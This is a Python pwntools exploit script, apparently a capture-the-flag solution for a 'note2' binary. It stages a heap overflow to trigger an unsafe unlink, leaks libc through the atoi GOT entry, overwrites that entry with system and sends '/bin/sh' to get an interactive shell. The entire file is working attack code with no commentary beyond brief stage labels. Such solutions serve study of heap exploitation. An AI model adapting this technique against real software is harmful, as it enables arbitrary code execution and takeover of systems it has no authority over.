from pwn import *

context.log_level = 'info'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./note2')
p = process("./note2")
gdb.attach(p)

def new(len,content):
    p.recvuntil('option--->>\n')
    p.sendline('1')
    p.sendline(str(len))
    p.sendline(content)

def show(id):
    p.recvuntil('option--->>\n')
    p.sendline('2')
    p.sendline(str(id))
    p.recvuntil('Content is ')

def edit(id,opt,content):
    p.recvuntil('option--->>\n')
    p.sendline('3')
    p.sendline(str(id))
    p.sendline(str(opt))
    p.sendline(content)

def delnote(id):
    p.recvuntil('option--->>\n')
    p.sendline('4')
    p.sendline(str(id))

p.sendline('author')
p.sendline('addr')
#stage1:heap layout
aim = 0x602120
FD = aim - 0x18
BK = aim - 0x10
fake_chunk = p64(0x0) + p64(0x61) + p64(FD) + p64(BK)
fake_chunk = fake_chunk.ljust(0x60,'b') + p64(0x60)
new(0x80,fake_chunk)	#id=0
new(0x0,'2abcd')	#id=1
new(0x80,'3abcd')	#id=2
#new(0x80,"/bin/sh")	#id=3 this cannot be new(),becase of the limit in id number
#stage2:overflow chunk and trigger unlink
payload = 'c' * 0x10 + p64(0xa0) + p64(0x90)
delnote(1)
new(0x0,payload)	#id=3
delnote(2)	#trigger unlink
#stage3:leak heap
puts_got = elf.got['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
log.success("atoi_got:" + hex(atoi_got))
payload = 'd' * 0x18 + p64(atoi_got)
edit(0,1,payload)
show(0)
atoi = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success("atoi addr:" + hex(atoi))
libc_base = atoi - libc.symbols['atoi']
log.success("libc symbol atoi:" + hex(libc.symbols['atoi']))
log.success("libc_base:" + hex(libc_base))
#stage4:get shell
sys = libc_base + libc.symbols['system']
edit(0,1,p64(sys))
p.recvuntil('option--->>\n')
p.sendline("/bin/sh")
##use free func fail,because within edit func,the free func has been used
#edit(3,1,"/bin/sh")
#raw_input()
#delnote(3)
p.interactive()
